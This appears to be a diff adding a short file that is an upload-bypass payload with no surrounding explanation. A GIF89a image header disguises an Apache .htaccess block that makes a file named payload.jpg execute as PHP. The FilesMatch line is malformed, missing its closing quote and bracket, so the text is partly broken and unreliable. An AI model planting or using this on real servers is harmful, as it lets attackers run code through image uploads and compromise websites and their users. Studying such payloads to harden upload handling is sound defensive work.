@@ -1,0 +1,4 @@
+GIF89a
+<FilesMatch "payload.jpg
+SetHandler application/x-httpd-php
+</FilesMatch>
